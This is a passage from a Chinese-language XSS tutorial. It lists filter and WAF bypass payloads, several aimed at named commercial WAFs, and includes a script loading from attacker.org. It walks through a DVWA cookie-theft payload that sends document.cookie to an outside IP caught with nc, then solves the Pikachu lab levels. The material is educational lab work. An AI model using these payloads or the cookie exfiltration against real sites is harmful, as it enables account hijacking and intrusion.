<span class="hljs-string">　　　　&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span>
<span class="hljs-string">　　　　&lt;input type=submit name=submit value=搜索 /&gt;</span>
<span class="hljs-string">　　　　&lt;/form&gt;</span>
<span class="hljs-string">　　&lt;/center&gt;&#x27;</span>;
<span class="hljs-meta">?&gt;</span></code></pre>

分析代码，不仅大小写不能用了，script，on，src ，data ，href 都直接转换成空，尝试双写绕过。

payload：

<pre><code class="hljs plaintext">&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;</code></pre>

![image-20230329105528009](浅析XSS漏洞/image-20230329105528009.png)

###### 1.3 字符串拼接绕过

利用eval()函数

与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。

<pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;&gt;
&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;&gt;
// 在js中，我们可以用反引号代替单双引号</code></pre>

利用top

<pre><code class="hljs plaintext">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;
&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](&quot;xss&quot;);&lt;/script&gt;</code></pre>

###### 1.4 其它字符混淆

<pre><code class="hljs plaintext">有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
下面举几个简单的例子

可利用注释、标签的优先级等
&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;
&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;
&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; 因为title标签的优先级比img的高，所以会先闭合title，
从而导致前面的img标签无效
&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;

&lt;scr&lt;!--test--&gt;ipt&gt;alert(&quot;hello world!&quot;)&lt;/scr&lt;!--test--&gt;ipt&gt;</code></pre>

###### 1.5 编码绕过

<pre><code class="hljs plaintext">Unicode编码绕过
&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;
&lt;img src=&quot;x&quot;
onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;

url编码绕过
&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;
&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;

Ascii码绕过
&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;

Hex绕过
&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;

八进制绕过
&lt;img src=x onerror=alert(&#x27;\170\163\163&#x27;)&gt;

base64绕过
&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;
&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre>

###### 1.6 过滤双引号，单引号

<pre><code class="hljs plaintext">如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号
&lt;img src=&quot;x&quot; onerror=alert(``xss``);&gt;
使用编码绕过，具体看上面列举的例子</code></pre>

###### 1.7 过滤括号

<pre><code class="hljs plaintext">当括号被过滤的时候可以使用throw来绕过
&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</code></pre>

###### 1.8 过滤url地址

<pre><code class="hljs plaintext">使用url编码
&lt;img src=&quot;x&quot; onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;

使用IP
&lt;img src=&quot;x&quot; onerror=document.location=``http://2130706433/``&gt;十进制

&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;八进制

&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;十六进制

&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;html标签中用//可以代替http://
使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)
使用中文逗号代替英文逗号

&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www。baidu。com``&quot;&gt;//会自动跳转到百度</code></pre>

htmlspecialchars() 函数可以把一些预定义的字符转换为 HTML 实体。

预定义的字符：

<pre><code class="hljs plaintext">&amp;：转换为&amp;amp;
&quot;：转换为&amp;quot;
&#x27;：转换为成为 &#x27;
&lt;：转换为&amp;lt;
&gt;：转换为&amp;gt;</code></pre>

<pre><code class="hljs plaintext">&#x27;onmouseover=&#x27;alert(/xss/)</code></pre>

#### 常规waf绕过思路

1.标签语法替换

<pre><code class="hljs plaintext">&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XSS&quot;)&lt;/scr&lt;script&gt;ipt&gt;</code></pre>

    <script>alert("XSS")</script>
<pre><code>&lt;script src="http://attacker.org/malicious.js"&gt;&lt;/script&gt;
</code></pre>
<p>2.特殊符号干扰</p>
<p>3.提交方式更改</p>
<p>4.垃圾数据溢出</p>
<p>5.加密解密算法</p>
<p>6.结合其他漏洞绕过</p>
<p>下面的列表包含了可绕过的WAF、Paylaod以及相关的绕过技术</p>
<pre><code>WAF名称：Cloudflare
Payload：&lt;a”/onclick=(confirm)()&gt;click
绕过技术：非空格填充

WAF名称：Wordfence
Payload：&lt;a/href=javascript&amp;colon;alert()&gt;click
绕过技术：数字字符编码

WAF名称：Barracuda
Payload：&lt;a/href=Java%0a%0d%09script&amp;colon;alert()&gt;click
绕过技术：数字字符编码

WAF名称：Comodo
Payload：&lt;d3v/onauxclick=(((confirm)))“&gt;click
绕过技术：黑名单中缺少事件处理器以及函数调用混淆

WAF名称：F5
Payload：&lt;d3v/onmouseleave=[2].some(confirm)&gt;click
绕过技术：黑名单中缺少事件处理器以及函数调用混淆

WAF名称：ModSecurity
Payload：&lt;details/open/ontoggle=alert()&gt;
绕过技术：黑名单中缺少标签或事件处理器

WAF名称：dotdefender
Payload：&lt;details/open/ontoggle=(confirm)()//
绕过技术：黑名单中缺少结束标签、事件处理器和函数调用混淆
</code></pre>
<h3 id="漏洞验证">漏洞验证</h3>
<h4 id="1-漏洞验证的相关概念">1、漏洞验证的相关概念</h4>
<p>POC：全称 ’ Proof of Concept '，中文 ’ 概念验证 ’ ，常指一段漏洞验证的代码。</p>
<p>EXP：全称 ’ Exploit '，中文 ’ 利用 '，指利用系统漏洞进行攻击的工具，即从漏洞检测验证到利用的工具。</p>
<p>Payload：中文 ’ 有效载荷 '，指成功exploit之后，真正在目标系统执行的代码或指令。</p>
<p>Shellcode：简单翻译 ’ shell代码 '，利用漏洞时所执行的代码，是Payload的一种。Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。</p>
<h4 id="2-漏洞验证相关概念之间的区别">2、漏洞验证相关概念之间的区别</h4>
<p><strong>（1）POC与EXP对比</strong></p>
<p>POC是用来验证漏洞存在的，EXP是用来完整利用漏洞(包括从验证到利用全过程)的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。</p>
<p><strong>（2）Payload与Shellcode</strong></p>
<p>Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。</p>
<p><strong>（3）Payload与EXP</strong></p>
<p>同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。</p>
<p><strong>（4）Payload模块</strong></p>
<p>在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。</p>
<h4 id="3-常见的poc">3、常见的POC</h4>
<p>可以用一段简单的代码（POC）来验证与检查漏洞的存在，常见的用于验证XSS漏洞存在的POC如下：</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;  //弹框，最常用
&lt;script&gt;confirm('xss')&lt;/script&gt;  //弹出确认框
&lt;script&gt;prompt('xss')&lt;/script&gt;   //弹出输入框
</code></pre>
<p>我们发现提交的代码<script>alert(/xss/)</script> ，被当作字符串输出在HTML页面中，浏览器会根据<script>标签识别为JS代码语句，并会执行它，执行弹窗操作。也就是说，可以执行其他任意JS代码，因此我们验证了XSS漏洞的存在性。</p>
<h2 id="实操：XSS获取cookie">实操：XSS获取cookie</h2>
<h3 id="一、前期准备">一、前期准备</h3>
<p>火狐为受害者，已经登陆到DVWA</p>
<p>chrome为攻击者，没有登陆权限/可以登录，但权限不如火狐高</p>
<p>在火狐输入xss语句获取cookie，使用chrome登录其账号</p>
<h3 id="二、构造xss语句">二、构造xss语句</h3>
<p>想要把cookie发送给攻击者，所以首先要想到使用get、post请求（下面是用get举例）</p>
<h4 id="1-构造初步代码">1.构造初步代码</h4>
<p>攻击者ip为192.168.136.149:8023，而想要发送的内容是cookie，所以先构造出一个简单的url：185.243.241.45:80/?cookie</p>
<h4 id="2-发送get请求">2.发送get请求</h4>
<p>发送get请求可使用的方法有：location重定向（访问当前页面的时候重定向到185.243.241.45:8023/?cookie这个页面）、img标签、script标签等</p>
<p>这里我们使用img标签</p>
<p>img标签传输原理：img标签传输分为两步，首先img src=”url“ 先向url发送一个get请求，之后把请求的内容当作图片展示在页面上</p>
<p>实际上我们只需要其第一步——向src后的url发送一个get请求</p>
<p>发送的代码</p>
<pre><code class="hljs plaintext">&lt;img src=&quot;http://185.243.241.45:5555/?cookie&quot;&gt;</code></pre>
<p>发送后无法识别图片（正常现象）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613190302252.png" alt="image-20230613190302252"></p>
<p>接收端我们使用nc去监听，其中接收端与发送端（xss语句）的端口要一致【让要攻击代码把cookie发送到5555端口，接收也在5555】</p>
<p>监听成功，但只收到了cookie的字符不是真正的cookie</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191636666.png" alt="image-20230613191636666"></p>
<p>说明发送端中的cookie只是数据不是指令</p>
<h4 id="3-构造xss语句">3.构造xss语句</h4>
<pre><code class="hljs plaintext">&lt;img src=&quot;http://185.243.241.45:5555/?cookie&quot;&gt;</code></pre>
<p>上述代码中的引号包括的部分为完整数据，所以不能直接使用document.cookie，需要进行区分</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191756421.png" alt="image-20230613191756421"></p>
<p>使用单引号将数据包含起来，再将三个字符串用加号拼接（’a‘ + ‘b’ = ‘ab’ ，JavaScript中字符串相加），变成【数据+指令执行的结果+数据】的形式</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191806665.png" alt="image-20230613191806665"></p>
<p>因为document.cookie是个JavaScript指令，在html页面中必须要用<script>标签包裹起来才可以运行（和alert一样，必须要<script>alert(a);</script>才可以使用）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230613191819543.png" alt="image-20230613191819543"></p>
<p>接下来需要将内容写入html页面中，使用document.write</p>
<pre><code class="hljs plaintext">&lt;script&gt;
document.write('&lt;img src="http://185.243.241.45:5555/?'+document.cookie+'"&gt;');
&lt;/script&gt;</code></pre>
<p>使用加号是为了执行document.cookie以获取cookie信息,且document.cookie如果不使用加号,会被当做字符串失去效果</p>
<p>总结：最外层的<script>标签是告诉浏览器，内部的东西要当作JavaScript脚本运行</p>
<p>document.wirte是将括号里的内容写到html页面当中去</p>
<p>在dvwa输入构造好的payload，再用nc监听</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613192445171.png" alt="image-20230613192445171"></p>
<p>这里一直获取不到大致是因为开启了httponly</p>
<p>这里看个思路吧…</p>
<h2 id="实操：pikachu-XSS通关">实操：pikachu-XSS通关</h2>
<h3 id="0x01-XSS-反射型GET">0x01-XSS(反射型GET)</h3>
<p>拿到一个xss漏洞，首先就是插入一个script代码试试<br>
所以这里我们插入一个<code>&lt;script&gt;alert(123)&lt;/script&gt;</code><br>
代码查看结果，发现对我们的输入长度有限制</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202224727.png" alt="image-20230613202224727"></p>
<p>一般长度限制都是通过前端html代码校验，所以这里我们有两种方法<br>
<strong>1.网页框之间输入</strong><br>
因为输入的Payload会在网址框显示，而网址框是没有长度限制的<br>
所以可以之间在网址框插入Payload</p>
<pre><code class="hljs plaintext">&lt;script&gt;alert(123)&lt;%2fscript&gt;
%2f为URL编码中的 /</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202410868.png" alt="image-20230613202410868"></p>
<p>但其实这里编码与否都能成功弹窗</p>
<p>注：使用之前需要查看浏览器是否自动转换URL编码，若无法自动转换则需要手动输入转换。<br>
<strong>2.直接修改html代码</strong><br>
我们在输入框 鼠标右键–检查 弹出开发者工具</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202718363.png" alt="image-20230613202718363"></p>
<p>这里将原本的20改为了100,当然可以更大</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202644986.png" alt="image-20230613202644986"></p>
<h3 id="0x02-xss-反射型POST">0x02-xss(反射型POST)</h3>
<p>一进去是个登录界面，刚开始还认为漏洞是在这两个框的其中一个，于是用用户名caker，密码123456试了一下，心想输入回显到页面上的应该是注入点，结果发现两个都没回显</p>
<p>点开提示一看要先用admin账号密码登录.</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204850445.png" alt="image-20230613204850445"></p>
<p>于是通过提示所给的账号登录后，得到一个提交页面，感觉和上一关差不多。。而且这关的输入框还没有长度限制</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204907648.png" alt="image-20230613204907648"></p>
<p>输入Payload：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>
成功获取admin的cookie</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204926199.png" alt="image-20230613204926199"></p>
<h3 id="0x03-XSS-存储型">0x03-XSS(存储型)</h3>
<p>第三关点开后是一个留言板界面</p>
<p>这里我直接尝试输入paylaod结果直接回显,那我们尝试拿cookie</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205046884.png" alt="image-20230613205046884"></p>
<pre><code class="hljs plaintext">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205155520.png" alt="image-20230613205155520"></p>
<p>点 确定 之后就变成下图这样了，虽然留言内容显示不出来，但是对比一开始进来的时候可以看到多了个“删除”，说明确实多了一条留言</p>
<p>右键–查看网页源代码 的话，可以看到payload在html代码中是原封不动的。。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205331480.png" alt="image-20230613205331480"></p>
<p>下面就是见识存储型XSS威力的时候了：</p>
<p>在另外一个浏览器中来到本关页面，也出现了同样的弹框。说明存储型XSS能危害所有访问受影响页面的用户。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205256232.png" alt="image-20230613205256232"></p>
<p>这里发现没有回显phpsessid,非常疑惑,毕竟之前那个实操也没有,于是我打开hackbar找到存储发现cookie中的httponly被设置了true</p>
<pre><code class="hljs plaintext">HttpOnly属性是用来限制非HTTP协议程序接口对客户端Cookie进行访问，将取Cookie的操作放到服务端，这样能有效的防止XSS攻击。</code></pre>
<p>导致防御了xss攻击,于是我尝试修改为false发现成功回显</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205537937.png" alt="image-20230613205537937"></p>
<h3 id="0x04-XSS-DOM型">0x04-XSS(DOM型)</h3>
<p>进入第四关发现又是只有一个输入框，所以我们直接输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>试试</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210228315.png" alt="image-20230613210228315"></p>
<p>输入后发现回显了一个链接名曰“what do you see?”</p>
<p>鼠标右键–查看网页源代码，Ctrl+F弹出搜索框，输入what do you see看看</p>
<p>找到了一段js代码，寻找DOM XSS的本质是做js语言阅读理解题</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210411147.png" alt="image-20230613210411147"></p>
<p>分析可以得出</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210806648.png" alt="image-20230613210806648"></p>
<p>利用了DOM将字符串进行了拼接并把值给a标签的href，然后输出一个what do you see?</p>
<p>所以我们可以利用已知条件构建payload效果为弹窗，弹窗内容为111</p>
<pre><code>&lt;a href='#' onclick=&quot;alert(111)&quot;&gt;'&gt;what do you see?&lt;/a&gt;
</code></pre>
<p>则payload为</p>
<pre><code class="hljs plaintext">#&#x27; onclick=&quot;alert(111)&quot;&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210917413.png" alt="image-20230613210917413"></p>
<h3 id="0x05-XSS-x-DOM型">0x05-XSS-x(DOM型)</h3>
<p>进入第五关发现也是一个输入框，在输入框中输了个“哈哈”，提交之后发现吃瓜群众跑到url里面去了（这就是和上一关的不同），然后多出来个链接“有些费尽心机想要忘记的事情,后来真的就忘掉了”</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613211243996.png" alt="image-20230613211243996"></p>
<p>继续右键查看源代码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613211744113.png" alt="image-20230613211744113"></p>
<p>分析代码可以得出这题跟第4题没啥差别，也是利用了DOM将字符串进行了拼接并把值给a标签的href，就是比第4题更容易利用而已</p>
<p>所以输入第四关的Payload:</p>
<pre><code class="hljs plaintext">#&#x27; onclick=&quot;alert(111)&quot;&gt;</code></pre>
<p>输出之后点击链接即可</p>
